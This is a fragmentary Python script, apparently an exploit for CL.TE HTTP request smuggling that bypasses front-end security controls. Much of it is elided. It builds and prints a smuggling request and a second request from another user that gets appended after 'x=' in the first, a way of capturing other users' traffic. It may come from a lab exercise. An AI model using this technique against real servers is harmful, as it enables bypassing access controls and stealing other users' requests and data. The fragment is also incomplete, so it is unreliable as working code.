...
print("="*60)
print("HTTP REQUEST SMUGGLING EXPLOIT - CL.TE to bypass front-end security controls")
print("="*60)
...
print("\n" + "="*60)
print("REQUEST 1: SMUGGLING (new request will be concatinated after x=)")
print("="*60)
print(req1)
...
"""Second request: it is a normal request which is made by other user. it will be appended after x= in req1 """
req2=f"""
POST / HTTP/1.1
Host: {host}
Content-Type: application/x-www-form-urlencoded
...
print("\n" + "="*60)
print("REQUEST 2: will be appended after x= from req1")
print("="*0)
print(req2)
